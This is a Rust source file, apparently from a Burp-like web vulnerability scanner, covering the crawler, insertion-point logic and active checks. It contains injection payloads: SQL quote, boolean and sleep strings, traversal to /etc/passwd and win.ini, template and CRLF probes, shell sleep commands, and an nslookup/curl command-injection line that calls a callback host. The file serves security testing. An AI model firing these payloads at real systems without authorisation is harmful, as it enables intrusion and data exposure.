//! Active scanner (Pro): crawls a target, finds insertion points in each request and sends attack
//! payloads to them, reporting issues next to the passive ones. Runs as Dashboard tasks.
//!
//! Insertion points are byte ranges in the raw request (query/body/cookie/JSON values and a few
//! headers); a payload replaces the range, encoded for its context.
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use crate::proxy::{self, Entry, State};
use crate::scanner::{Issue, Severity};

// ------------------------------------------------------------ insertion points

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Kind {
    Query,
    Body,
    Cookie,
    Json,
    Header,
}

#[derive(Clone, Debug, PartialEq)]
pub struct Point {
    pub kind: Kind,
    pub name: String,
    pub start: usize,
    pub end: usize,
}

impl Point {
    pub fn label(&self) -> String {
        let k = match self.kind {
            Kind::Query => "URL parameter",
            Kind::Body => "body parameter",
            Kind::Cookie => "cookie",
            Kind::Json => "JSON parameter",
            Kind::Header => "HTTP header",
        };
        format!("{k} {}", self.name)
    }
}

/// `k=v&k=v` value ranges inside `s`, offset by `base`.
fn pairs(s: &str, base: usize, sep: char, kind: Kind, out: &mut Vec<Point>) {
    let mut pos = 0;
    for part in s.split(sep) {
        if let Some(eq) = part.find('=') {
            let name = part[..eq].trim().to_string();
            if !name.is_empty() {
                out.push(Point {
                    kind,
                    name,
                    start: base + pos + eq + 1,
                    end: base + pos + part.len(),
                });
            }
        }
        pos += part.len() + sep.len_utf8();
    }
}

pub fn points(req: &str) -> Vec<Point> {
    let mut out = vec![];
    let head_end = req.find("\r\n\r\n").unwrap_or(req.len());
    let first_end = req.find("\r\n").unwrap_or(head_end);
    let first = &req[..first_end];
    if let Some(q) = first.find('?') {
        let end = first
            .rfind(" HTTP/")
            .filter(|&e| e > q)
            .unwrap_or(first.len());
        pairs(&first[q + 1..end], q + 1, '&', Kind::Query, &mut out);
    }
    let mut pos = first_end + 2;
    let mut json = false;
    let mut form = false;
    while pos < head_end {
        let end = req[pos..head_end]
            .find("\r\n")
            .map_or(head_end, |e| pos + e);
        let line = &req[pos..end];
        if let Some((k, v)) = line.split_once(':') {
            let vstart = pos + k.len() + 1 + (v.len() - v.trim_start().len());
            match k.trim().to_ascii_lowercase().as_str() {
                "cookie" => pairs(&req[vstart..end], vstart, ';', Kind::Cookie, &mut out),
                "user-agent" | "referer" => out.push(Point {
                    kind: Kind::Header,
                    name: k.trim().into(),
                    start: vstart,
                    end,
                }),
                "content-type" => {
                    let v = v.to_ascii_lowercase();
                    json = v.contains("json");
                    form = v.contains("x-www-form-urlencoded");
                }
                _ => {}
            }
        }
        pos = end + 2;
    }
    let bstart = (head_end + 4).min(req.len());
    let body = &req[bstart..];
    if json || body.trim_start().starts_with('{') {
        let re = regex::Regex::new(
            r#""([^"\\]+)"\s*:\s*(?:"((?:[^"\\]|\\.)*)"|(-?\d+(?:\.\d+)?|true|false))"#,
        )
        .unwrap();
        for c in re.captures_iter(body) {
            let v = c.get(2).or(c.get(3)).unwrap();
            out.push(Point {
                kind: Kind::Json,
                name: c[1].to_string(),
                start: bstart + v.start(),
                end: bstart + v.end(),
            });
        }
    } else if form || (body.contains('=') && !body.trim_start().starts_with('<')) {
        pairs(body, bstart, '&', Kind::Body, &mut out);
    }
    out
}

/// Request with `value` in place of the point, encoded for its context and Content-Length fixed.
pub fn inject(req: &str, p: &Point, value: &str) -> String {
    let enc = match p.kind {
        Kind::Query | Kind::Body => value
            .bytes()
            .map(|b| {
                if b.is_ascii_alphanumeric() || b"-_.~!*'()/:".contains(&b) {
                    (b as char).to_string()
                } else {
                    format!("%{b:02X}")
                }
            })
            .collect(),
        Kind::Cookie => value
            .replace(';', "%3b")
            .replace(' ', "%20")
            .replace('\r', "%0d")
            .replace('\n', "%0a"),
        Kind::Json => value.replace('\\', "\\\\").replace('"', "\\\""),
        Kind::Header => value.replace(['\r', '\n'], ""),
    };
    let quoted = p.kind == Kind::Json && !req[..p.start].ends_with('"');
    let enc = if quoted { format!("\"{enc}\"") } else { enc };
    crate::tools::fix_content_length(&format!("{}{enc}{}", &req[..p.start], &req[p.end..]))
}

// ------------------------------------------------------------ configuration

pub const CHECKS: [&str; 9] = [
    "SQL injection",
    "Cross-site scripting (reflected)",
    "OS command injection",
    "File path traversal",
    "Server-side template injection",
    "Open redirection",
    "HTTP response header injection",
    "Out-of-band interactions (Collaborator)",
    "Time-based checks (slow)",
];

#[derive(Clone)]
pub struct Config {
    pub checks: [bool; CHECKS.len()],
    pub crawl: bool,
    pub max_pages: usize,
    pub threads: usize,
    pub delay_ms: u64,
    /// Extra request headers (one `Name: value` per line), e.g. an Authorization header.
    pub headers: String,
    /// Raw login request sent before the scan; its Set-Cookie values join every request.
    pub login: String,
}

impl Config {
    pub fn fast() -> Self {
        let mut checks = [true; CHECKS.len()];
        checks[8] = false;
        Self {
            checks,
            crawl: true,
            max_pages: 100,
            threads: 6,
            delay_ms: 0,
            headers: String::new(),
            login: String::new(),
        }
    }
    pub fn thorough() -> Self {
        Self {
            checks: [true; CHECKS.len()],
            max_pages: 500,
            ..Self::fast()
        }
    }
    fn on(&self, name: &str) -> bool {
        CHECKS
            .iter()
            .position(|c| *c == name)
            .is_some_and(|i| self.checks[i])
    }
}

// ------------------------------------------------------------ task

pub struct Task {
    pub name: String,
    /// Origins this task scans (`https://host[:port]`), to pick its issues.
    pub origins: Vec<String>,
    pub status: Arc<Mutex<String>>,
    pub requests: Arc<AtomicUsize>,
    pub issues: Arc<AtomicUsize>,
    pub stop: Arc<AtomicBool>,
    pub done: Arc<AtomicBool>,
}

/// What a scan request goes to: origin parts, as in history entries.
#[derive(Clone)]
pub struct Target {
    pub host: String,
    pub port: u16,
    pub tls: bool,
}

struct Ctx {
    target: Target,
    cfg: Config,
    state: State,
    task: usize,
    requests: Arc<AtomicUsize>,
    issues: Arc<AtomicUsize>,
    stop: Arc<AtomicBool>,
    /// Session cookies from the login request.
    cookies: Mutex<String>,
    /// Collaborator payload label -> (issue context) for out-of-band findings.
    oob: Mutex<Vec<(String, &'static str, String, String)>>, // label, issue name, detail, request
}

pub fn parse_url(url: &str) -> Option<(Target, String)> {
    let (tls, rest) = if let Some(r) = url.strip_prefix("https://") {
        (true, r)
    } else {
        (false, url.strip_prefix("http://")?)
    };
    let (hostport, path) = rest
        .split_once('/')
        .map(|(h, p)| (h, format!("/{p}")))
        .unwrap_or((rest, "/".into()));
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) if p.parse::<u16>().is_ok() => (h.to_string(), p.parse().unwrap()),
        _ => (hostport.to_string(), if tls { 443 } else { 80 }),
    };
    (!host.is_empty()).then_some((Target { host, port, tls }, path))
}

fn host_header(t: &Target) -> String {
    if (t.tls && t.port == 443) || (!t.tls && t.port == 80) {
        t.host.clone()
    } else {
        format!("{}:{}", t.host, t.port)
    }
}

pub fn get_request(t: &Target, path: &str) -> String {
    format!(
        "GET {path} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (BurpCraft Scanner)\r\nAccept: */*\r\nConnection: close\r\n\r\n",
        host_header(t)
    )
}

fn status_of(resp: &[u8]) -> u16 {
    String::from_utf8_lossy(proxy::head(resp))
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0)
}

pub fn entry_of(t: &Target, req: &str, resp: &[u8], tool: &'static str) -> Entry {
    let mut line = req.lines().next().unwrap_or("").split(' ');
    Entry {
        id: 0,
        host: t.host.clone(),
        port: t.port,
        tls: t.tls,
        method: line.next().unwrap_or("").into(),
        url: line.next().unwrap_or("").into(),
        status: status_of(resp),
        req: req.as_bytes().to_vec(),
        resp: resp.to_vec(),
        edited: false,
        time: proxy::now(),
        ip: String::new(),
        listener: 0,
        comment: String::new(),
        highlight: None,
        tool,
    }
}

impl Ctx {
    /// Adds auth headers/cookies, sends, logs; None when stopped or on a network error.
    fn send(&self, req: &str) -> Option<(Vec<u8>, Duration)> {
        if self.stop.load(Ordering::SeqCst) {
            return None;
        }
        let mut req = req.to_string();
        let extra: String = self
            .cfg
            .headers
            .lines()
            .map(str::trim)
            .filter(|l| l.contains(':'))
            .map(|l| format!("{l}\r\n"))
            .collect();
        let cookies = self.cookies.lock().unwrap().clone();
        if let Some(i) = req.find("\r\n") {
            let mut add = extra;
            if !cookies.is_empty() {
                add += &format!("Cookie: {cookies}\r\n");
            }
            req.insert_str(i + 2, &add);
        }
        if self.cfg.delay_ms > 0 {
            std::thread::sleep(Duration::from_millis(self.cfg.delay_ms));
        }
        let t0 = Instant::now();
        let resp = crate::net::send(
            &self.target.host,
            self.target.port,
            self.target.tls,
            req.as_bytes(),
        )
        .ok()?;
        let took = t0.elapsed();
        self.requests.fetch_add(1, Ordering::SeqCst);
        self.state.lock().unwrap().log_tool(
            "Scanner",
            &self.target.host,
            self.target.port,
            self.target.tls,
            req.as_bytes(),
            &resp,
        );
        Some((resp, took))
    }

    fn report(
        &self,
        name: &'static str,
        severity: Severity,
        confidence: &'static str,
        detail: String,
        req: &str,
        resp: &[u8],
    ) {
        let (background, remediation) = advice(name);
        let e = entry_of(&self.target, req, resp, "Scanner");
        let issue = Issue {
            id: 0,
            name,
            severity,
            confidence,
            origin: e.origin(),
            path: e.path().to_string(),
            detail,
            background,
            remediation,
            entry_id: 0,
        };
        self.report_issue(issue, e);
    }

    /// Records an issue (once per name/location/detail) with its request/response as evidence.
    fn report_issue(&self, mut issue: Issue, mut e: Entry) {
        let mut s = self.state.lock().unwrap();
        if s.issues.iter().any(|x| {
            x.name == issue.name
                && x.origin == issue.origin
                && x.path == issue.path
                && x.detail == issue.detail
        }) {
            return;
        }
        e.id = s.next_id;
        s.next_id += 1;
        issue.entry_id = e.id;
        s.history.push(e);
        issue.id = s.issues.len() + 1;
        s.event(
            "Scanner",
            format!("Task {}: {} found", self.task, issue.name),
        );
        s.issues.push(issue);
        self.issues.fetch_add(1, Ordering::SeqCst);
    }

    /// BChecks: `given host` once per target.
    fn host_bchecks(&self) {
        for b in crate::bcheck::enabled(|g| *g == crate::bcheck::Given::Host) {
            let crate::bcheck::Action::Request { method, path } = &b.action else {
                continue;
            };
            let req = get_request(&self.target, path).replacen("GET ", &format!("{method} "), 1);
            if let Some((resp, _)) = self.send(&req)
                && b.holds(&crate::bcheck::Responses {
                    latest: &resp,
                    base: None,
                })
            {
                let e = entry_of(&self.target, &req, &resp, "Scanner");
                self.report_issue(b.issue(e.origin(), e.path().to_string(), 0), e);
            }
        }
    }
}

fn advice(name: &str) -> (&'static str, &'static str) {
    match name {
        "SQL injection" => (
            "User input is placed into a database query without proper handling, so it can change the query's meaning: read or modify data, bypass logins, sometimes run commands.",
            "Use parameterized queries (prepared statements) for every query; never build SQL by concatenating input.",
        ),
        "Cross-site scripting (reflected)" => (
            "Input is copied into the response unescaped, so an attacker's link can run script in a victim's browser in the context of this site.",
            "Encode output for its HTML context, validate input strictly, and add a Content-Security-Policy.",
        ),
        "OS command injection" => (
            "Input reaches an operating-system command, letting an attacker run arbitrary commands on the server.",
            "Avoid shell commands with user input; use APIs that take argument lists, and allow-list values.",
        ),
        "File path traversal" => (
            "Input is used in a file path, so `../` sequences reach files outside the intended directory.",
            "Do not pass input to file APIs; map identifiers to files server-side, or canonicalize and check the base directory.",
        ),
        "Server-side template injection" => (
            "Input is evaluated as template code on the server, which often leads to remote code execution.",
            "Never build templates from input; pass input only as template data, and use a sandboxed engine.",
        ),
        "Open redirection" => (
            "The application redirects to a URL taken from the request, which helps phishing and can chain into other attacks.",
            "Redirect only to relative paths or an allow-list of destinations.",
        ),
        "HTTP response header injection" => (
            "Input containing CR/LF ends up in a response header, so an attacker can add headers or split the response.",
            "Reject or strip CR and LF in anything copied into headers.",
        ),
        "External service interaction" => (
            "The server made a network request (DNS/HTTP) to a domain supplied in the input, a sign of SSRF or blind injection.",
            "Do not fetch URLs or resolve hosts from input; if needed, use a strict allow-list and block internal addresses.",
        ),
        _ => ("", ""),
    }
}

// ------------------------------------------------------------ checks

const SQL_ERRORS: &[&str] = &[
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "postgresql query failed",
    "syntax error at or near",
    "sqlite3::",
    "sqlite error",
    "near \"",
    "ora-00933",
    "ora-01756",
    "odbc sql server driver",
    "sqlstate[",
    "microsoft ole db provider for sql server",
];

fn body_text(resp: &[u8]) -> String {
    String::from_utf8_lossy(&proxy::body_bytes(resp)).into_owned()
}

/// Similar enough to count as "the same page" (boolean-based inference).
fn same_page(a: &[u8], b: &[u8]) -> bool {
    let (a, b) = (body_text(a), body_text(b));
    status_of_eq(a.len(), b.len()) && a.lines().count().abs_diff(b.lines().count()) <= 1
}

fn status_of_eq(a: usize, b: usize) -> bool {
    a.abs_diff(b) <= (a.max(b) / 50).max(8)
}

fn token() -> String {
    let n = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or(7);
    format!("bc{:06}", n % 1_000_000)
}

fn audit_point(c: &Ctx, req: &str, p: &Point, base: &(Vec<u8>, Duration)) {
    let orig = req[p.start..p.end].to_string();
    // BChecks: `given [kind] insertion point`
    let kind = format!("{:?}", p.kind).to_ascii_lowercase();
    for b in crate::bcheck::enabled(
        |g| matches!(g, crate::bcheck::Given::Point(k) if k.as_ref().is_none_or(|k| *k == kind)),
    ) {
        let value = match &b.action {
            crate::bcheck::Action::Append(s) => format!("{orig}{s}"),
            crate::bcheck::Action::Replace(s) => s.clone(),
            _ => continue,
        };
        let r = inject(req, p, &value);
        if let Some((resp, _)) = c.send(&r)
            && b.holds(&crate::bcheck::Responses {
                latest: &resp,
                base: Some(&base.0),
            })
        {
            let e = entry_of(&c.target, &r, &resp, "Scanner");
            let mut issue = b.issue(e.origin(), e.path().to_string(), 0);
            issue.detail = format!("{} ({})", issue.detail, p.label());
            c.report_issue(issue, e);
        }
    }
    let base_body = body_text(&base.0).to_lowercase();
    let lab = p.label();

    if c.cfg.on("SQL injection") {
        for q in ["'", "\""] {
            let r = inject(req, p, &format!("{orig}{q}"));
            if let Some((resp, _)) = c.send(&r) {
                let low = body_text(&resp).to_lowercase();
                if let Some(e) = SQL_ERRORS
                    .iter()
                    .find(|e| low.contains(*e) && !base_body.contains(*e))
                {
                    c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable: submitting a {q} quote produced the database error \"{e}\"."), &r, &resp);
                    return;
                }
            }
        }
        // boolean inference: an always-true condition keeps the page, an always-false one changes it
        for (t, f) in [
            (format!("{orig}' AND '1'='1"), format!("{orig}' AND '1'='2")),
            (format!("{orig} AND 1=1"), format!("{orig} AND 1=2")),
        ] {
            let (rt, rf) = (inject(req, p, &t), inject(req, p, &f));
            if let (Some((a, _)), Some((b, _))) = (c.send(&rt), c.send(&rf))
                && same_page(&a, &base.0)
                && !same_page(&b, &base.0)
                && let (Some((a2, _)), Some((b2, _))) = (c.send(&rt), c.send(&rf))
                && same_page(&a2, &a)
                && same_page(&b2, &b)
            {
                c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable to boolean-based SQL injection: `{t}` returned the original page, `{f}` a different one (confirmed twice)."), &rf, &b);
                return;
            }
        }
        if c.cfg.on("Time-based checks (slow)") {
            for pl in [
                "' AND SLEEP(5)-- -",
                "'||pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                " AND SLEEP(5)",
            ] {
                let r = inject(req, p, &format!("{orig}{pl}"));
                if c.send(&r)
                    .is_some_and(|(_, t)| t > base.1 + Duration::from_millis(4500))
                    && let Some((resp, t)) = c
                        .send(&r)
                        .filter(|(_, t)| *t > base.1 + Duration::from_millis(4500))
                {
                    c.report("SQL injection", Severity::High, "Firm", format!("The {lab} appears vulnerable to time-based SQL injection: `{pl}` delayed the response by {:.1}s (twice).", t.as_secs_f32()), &r, &resp);
                    return;
                }
            }
        }
    }
    if c.cfg.on("Cross-site scripting (reflected)") {
        let tk = token();
        let pl = format!("{tk}<b\"'>{tk}");
        let r = inject(req, p, &pl);
        if let Some((resp, _)) = c.send(&r)
            && body_text(&resp).contains(&pl)
            && !String::from_utf8_lossy(proxy::head(&resp))
                .to_ascii_lowercase()
                .contains("content-type: application/json")
        {
            c.report("Cross-site scripting (reflected)", Severity::High, "Firm", format!("The value of the {lab} is copied into the response without HTML encoding: `{pl}` came back unchanged."), &r, &resp);
        }
    }
    if c.cfg.on("File path traversal") {
        for (pl, mark) in [
            ("../../../../../../../../etc/passwd", "root:x:0:0"),
            ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0"),
            ("/etc/passwd", "root:x:0:0"),
            ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ] {
            let r = inject(req, p, pl);
            if let Some((resp, _)) = c.send(&r)
                && body_text(&resp).contains(mark)
                && !base_body.contains(mark)
            {
                c.report("File path traversal", Severity::High, "Firm", format!("The {lab} is used to read files: `{pl}` returned content containing `{mark}`."), &r, &resp);
                break;
            }
        }
    }
    if c.cfg.on("Server-side template injection") {
        for pl in ["{{7*7191}}", "${7*7191}", "<%= 7*7191 %>", "#{7*7191}"] {
            let r = inject(req, p, pl);
            if let Some((resp, _)) = c.send(&r)
                && body_text(&resp).contains("50337") // 7*7191
                && !base_body.contains("50337")
            {
                c.report(
                    "Server-side template injection",
                    Severity::High,
                    "Firm",
                    format!("The {lab} is evaluated by a template engine: `{pl}` produced 50337."),
                    &r,
                    &resp,
                );
                break;
            }
        }
    }
    if c.cfg.on("Open redirection") {
        let pl = "https://burpcraft-redirect.example/";
        let r = inject(req, p, pl);
        if let Some((resp, _)) = c.send(&r)
            && (300..400).contains(&status_of(&resp))
            && crate::net::header(&String::from_utf8_lossy(proxy::head(&resp)), "location")
                .is_some_and(|l| l.starts_with(pl) || l.starts_with("//burpcraft-redirect.example"))
        {
            c.report(
                "Open redirection",
                Severity::Medium,
                "Firm",
                format!("The {lab} controls the redirect target: the response redirected to {pl}."),
                &r,
                &resp,
            );
        }
    }
    if c.cfg.on("HTTP response header injection") && p.kind != Kind::Header {
        let r = inject(req, p, &format!("{orig}\r\nX-Bc-Injected: 1"));
        if let Some((resp, _)) = c.send(&r)
            && String::from_utf8_lossy(proxy::head(&resp))
                .lines()
                .any(|l| l.eq_ignore_ascii_case("x-bc-injected: 1"))
        {
            c.report(
                "HTTP response header injection",
                Severity::Medium,
                "Firm",
                format!("CR/LF in the {lab} adds a response header (X-Bc-Injected)."),
                &r,
                &resp,
            );
        }
    }
    if c.cfg.on("OS command injection") && c.cfg.on("Time-based checks (slow)") {
        for pl in [
            ";sleep 5;",
            "|sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "& ping -n 6 127.0.0.1 &",
        ] {
            let r = inject(req, p, &format!("{orig}{pl}"));
            if c.send(&r)
                .is_some_and(|(_, t)| t > base.1 + Duration::from_millis(4500))
                && let Some((resp, t)) = c
                    .send(&r)
                    .filter(|(_, t)| *t > base.1 + Duration::from_millis(4500))
            {
                c.report(
                    "OS command injection",
                    Severity::High,
                    "Firm",
                    format!(
                        "The {lab} reaches a shell: `{pl}` delayed the response by {:.1}s (twice).",
                        t.as_secs_f32()
                    ),
                    &r,
                    &resp,
                );
                break;
            }
        }
    }
    if c.cfg.on("Out-of-band interactions (Collaborator)") {
        let mut cl = crate::collab::client().lock().unwrap();
        if cl.configured() {
            let mut plan = vec![];
            for (what, issue) in [
                ("url", "External service interaction"),
                ("cmd", "OS command injection"),
            ] {
                let l = format!("Scan {} {lab} {what} {}", c.task, p.start);
                let Some(host) = cl.payload(&l) else { break };
                let pl = if what == "url" {
                    format!("http://{host}/")
                } else {
                    format!(
                        "{orig}|nslookup {h};curl http://{host}/",
                        h = host.split('/').next().unwrap_or("")
                    )
                };
                plan.push((l, issue, pl));
            }
            drop(cl);
            for (l, issue, pl) in plan {
                let r = inject(req, p, &pl);
                if c.send(&r).is_some() {
                    c.oob.lock().unwrap().push((l, issue, format!("The {lab} triggered an interaction with the Collaborator server: payload `{pl}`."), r));
                }
            }
        }
    }
}

/// Audits every insertion point of one request.
fn audit(c: &Ctx, req: &str) {
    let Some(base) = c.send(req) else { return };
    for p in points(req) {
        if c.stop.load(Ordering::SeqCst) {
            return;
        }
        audit_point(c, req, &p, &base);
    }
}

// ------------------------------------------------------------ crawler

/// Same-origin links, form targets (as ready requests) found in a page.
pub fn links(base_path: &str, html: &str, t: &Target) -> (Vec<String>, Vec<String>) {
    let href = regex::Regex::new(r#"(?i)(?:href|src)\s*=\s*["']([^"'#]+)"#).unwrap();
    let form = regex::Regex::new(r#"(?is)<form\b([^>]*)>(.*?)</form>"#).unwrap();
    let attr = |s: &str, a: &str| {
        regex::Regex::new(&format!(r#"(?i)\b{a}\s*=\s*["']([^"']*)["']"#))
            .unwrap()
            .captures(s)
            .map(|c| c[1].to_string())
    };
    let input = regex::Regex::new(r#"(?is)<(?:input|textarea|select)\b([^>]*)>"#).unwrap();
    let origin = format!(
        "{}://{}",
        if t.tls { "https" } else { "http" },
        host_header(t)
    );
    let resolve = |u: &str| -> Option<String> {
        let u = crate::codec::html_decode(u.trim());
        if let Some(rest) = u.strip_prefix(&origin) {
            return Some(if rest.is_empty() {
                "/".into()
            } else {
                rest.to_string()
            });
        }
        // another origin or scheme (http:, javascript:, mailto:...): only a prefix counts, not "?u=http://" in a query
        let scheme = u.split(['/', '?', '#']).next().unwrap_or("").contains(':');
        if scheme || u.starts_with("//") {
            return None;
        }
        Some(if u.starts_with('/') {
            u
        } else {
            format!(
                "{}{u}",
                base_path[..base_path.rfind('/').map_or(0, |i| i + 1)]
                    .trim_end_matches(|c| c != '/')
            )
        })
    };
    let static_ext = regex::Regex::new(
        r"(?i)\.(png|jpe?g|gif|ico|svg|css|woff2?|ttf|eot|mp4|webp|pdf|zip)(\?|$)",
    )
    .unwrap();
    let mut pages: Vec<String> = href
        .captures_iter(html)
        .filter_map(|c| resolve(&c[1]))
        .filter(|u| !static_ext.is_match(u))
        .collect();
    let mut forms = vec![];
    for f in form.captures_iter(html) {
        let action = attr(&f[1], "action")
            .and_then(|a| resolve(&a))
            .unwrap_or_else(|| base_path.to_string());
        let method = attr(&f[1], "method")
            .unwrap_or_else(|| "get".into())
            .to_ascii_uppercase();
        let fields: Vec<String> = input
            .captures_iter(&f[2])
            .filter_map(|i| {
                let name = attr(&i[1], "name")?;
                let value = attr(&i[1], "value")
                    .filter(|v| !v.is_empty())
                    .unwrap_or_else(|| "test".into());
                Some(format!(
                    "{}={}",
                    crate::codec::url_encode(name.as_bytes(), false),
                    crate::codec::url_encode(value.as_bytes(), false)
                ))
            })
            .collect();
        let qs = fields.join("&");
        if method == "POST" {
            let path = action.clone();
            forms.push(format!(
                "POST {path} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (BurpCraft Scanner)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{qs}",
                host_header(t),
                qs.len()
            ));
        } else {
            let sep = if action.contains('?') { '&' } else { '?' };
            pages.push(if qs.is_empty() {
                action
            } else {
                format!("{action}{sep}{qs}")
            });
        }
    }
    pages.dedup();
    (pages, forms)
}

/// Breadth-first crawl from `start`; returns the requests worth auditing (with insertion points).
fn crawl(c: &Ctx, start: &str, status: &Mutex<String>) -> Vec<String> {
    let mut queue = std::collections::VecDeque::from([start.to_string()]);
    let mut seen = std::collections::HashSet::new();
    let mut audit = vec![];
    let shape = |path: &str| {
        // one page per path + parameter names, not per value
        let (p, q) = path.split_once('?').unwrap_or((path, ""));
        let mut names: Vec<&str> = q
            .split('&')
            .map(|kv| kv.split('=').next().unwrap_or(""))
            .collect();
        names.sort();
        format!("{p}?{}", names.join("&"))
    };
    while let Some(path) = queue.pop_front() {
        if seen.len() >= c.cfg.max_pages || c.stop.load(Ordering::SeqCst) {
            break;
        }
        if !seen.insert(shape(&path)) {
            continue;
        }
        *status.lock().unwrap() = format!("Crawling: {} pages, {path}", seen.len());
        let req = get_request(&c.target, &path);
        let Some((resp, _)) = c.send(&req) else {
            continue;
        };
        {
            let mut s = c.state.lock().unwrap();
            let mut e = entry_of(&c.target, &req, &resp, "Crawler");
            e.id = s.next_id;
            s.next_id += 1;
            s.history.push(e);
        }
        if path.contains('?') {
            audit.push(req);
        }
        let ct = crate::net::header(&String::from_utf8_lossy(proxy::head(&resp)), "content-type")
            .unwrap_or_default();
        if !ct.contains("html") {
            continue;
        }
        let (pages, forms) = links(&path, &body_text(&resp), &c.target);
        for f in forms {
            if seen.insert(shape(&format!(
                "POST {}",
                f.split_whitespace().nth(1).unwrap_or("")
            ))) {
                audit.push(f);
            }
        }
        queue.extend(pages);
    }
    audit
}

// ------------------------------------------------------------ entry points

/// Starts a scan task: crawl (optional) and audit `urls`, plus `extra` raw requests (from history or an API definition).
pub fn start(
    id: usize,
    urls: Vec<String>,
    extra: Vec<(Target, String)>,
    cfg: Config,
    state: State,
) -> Task {
    let name = urls
        .first()
        .cloned()
        .or_else(|| {
            extra.first().map(|(t, r)| {
                format!(
                    "{}{}",
                    host_header(t),
                    r.split_whitespace().nth(1).unwrap_or("")
                )
            })
        })
        .unwrap_or_default();
    let origin = |t: &Target| {
        format!(
            "{}://{}",
            if t.tls { "https" } else { "http" },
            host_header(t)
        )
    };
    let mut origins: Vec<String> = urls
        .iter()
        .filter_map(|u| parse_url(u.trim()))
        .map(|(t, _)| origin(&t))
        .chain(extra.iter().map(|(t, _)| origin(t)))
        .collect();
    origins.dedup();
    let task = Task {
        origins,
        name: format!(
            "{}. {} {name}",
            id,
            if cfg.crawl && !urls.is_empty() {
                "Crawl and audit of"
            } else {
                "Audit of"
            }
        ),
        status: Arc::new(Mutex::new("Starting".into())),
        requests: Default::default(),
        issues: Default::default(),
        stop: Default::default(),
        done: Default::default(),
    };
    let (status, requests, issues, stop, done) = (
        task.status.clone(),
        task.requests.clone(),
        task.issues.clone(),
        task.stop.clone(),
        task.done.clone(),
    );
    std::thread::spawn(move || {
        let mut work: Vec<(Target, String)> = extra;
        let mut ctxs: Vec<Arc<Ctx>> = vec![];
        let ctx_for = |t: &Target, ctxs: &mut Vec<Arc<Ctx>>| -> Arc<Ctx> {
            if let Some(c) = ctxs.iter().find(|c| {
                c.target.host == t.host && c.target.port == t.port && c.target.tls == t.tls
            }) {
                return c.clone();
            }
            let c = Arc::new(Ctx {
                target: t.clone(),
                cfg: cfg.clone(),
                state: state.clone(),
                task: id,
                requests: requests.clone(),
                issues: issues.clone(),
                stop: stop.clone(),
                cookies: Mutex::default(),
                oob: Mutex::default(),
            });
            if !cfg.login.trim().is_empty() {
                *status.lock().unwrap() = "Logging in".into();
                let login = crate::tools::fix_content_length(
                    &cfg.login.replace("\r\n", "\n").replace('\n', "\r\n"),
                );
                if let Some((resp, _)) = c.send(&login) {
                    let set: Vec<String> = String::from_utf8_lossy(proxy::head(&resp))
                        .lines()
                        .filter_map(|l| {
                            l.split_once(':')
                                .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
                                .map(|(_, v)| v.trim().split(';').next().unwrap_or("").to_string())
                        })
                        .collect();
                    *c.cookies.lock().unwrap() = set.join("; ");
                }
            }
            ctxs.push(c.clone());
            c
        };
        for u in &urls {
            let Some((t, path)) = parse_url(u.trim()) else {
                continue;
            };
            let c = ctx_for(&t, &mut ctxs);
            if cfg.crawl {
                work.extend(
                    crawl(&c, &path, &status)
                        .into_iter()
                        .map(|r| (t.clone(), r)),
                );
            } else {
                work.push((t, get_request(&c.target, &path)));
            }
        }
        // one context (session) per target, shared by the worker pool
        for (t, _) in work.iter() {
            ctx_for(t, &mut ctxs);
        }
        for c in &ctxs {
            c.host_bchecks();
        }
        let total = work.len();
        let (next, work, shared) = (
            Arc::new(AtomicUsize::new(0)),
            Arc::new(work),
            Arc::new(ctxs),
        );
        let pool: Vec<_> = (0..cfg.threads.max(1))
            .map(|_| {
                let (work, next, status, shared) =
                    (work.clone(), next.clone(), status.clone(), shared.clone());
                std::thread::spawn(move || {
                    while let Some((t, req)) = work.get(next.fetch_add(1, Ordering::SeqCst)) {
                        let Some(c) = shared.iter().find(|c| {
                            c.target.host == t.host
                                && c.target.port == t.port
                                && c.target.tls == t.tls
                        }) else {
                            continue;
                        };
                        *status.lock().unwrap() = format!(
                            "Auditing {} of {total}: {}",
                            next.load(Ordering::SeqCst).min(total),
                            req.lines().next().unwrap_or("")
                        );
                        audit(c, req);
                    }
                })
            })
            .collect();
        pool.into_iter().for_each(|h| {
            let _ = h.join();
        });
        let used = shared;
        // out-of-band: give the target a moment, then poll and match labels
        let pending: Vec<(Arc<Ctx>, (String, &'static str, String, String))> = used
            .iter()
            .flat_map(|c| {
                c.oob
                    .lock()
                    .unwrap()
                    .drain(..)
                    .map(|o| (c.clone(), o))
                    .collect::<Vec<_>>()
            })
            .collect();
        if !pending.is_empty() && !stop.load(Ordering::SeqCst) {
            *status.lock().unwrap() = "Waiting for out-of-band interactions".into();
            for _ in 0..3 {
                std::thread::sleep(Duration::from_secs(2));
                let _ = crate::collab::poll();
            }
            let hits = crate::collab::interactions_for(&format!("Scan {id} "));
            for (c, (label, issue, detail, req)) in pending {
                if let Some((it, _)) = hits.iter().find(|(_, l)| *l == label) {
                    let name = if issue == "OS command injection" {
                        "OS command injection"
                    } else {
                        "External service interaction"
                    };
                    c.report(
                        name,
                        Severity::High,
                        "Certain",
                        format!(
                            "{detail} The server made a {} request from {}.",
                            it.protocol, it.client_ip
                        ),
                        &req,
                        &it.raw,
                    );
                }
            }
        }
        *status.lock().unwrap() = if stop.load(Ordering::SeqCst) {
            "Stopped".into()
        } else {
            format!(
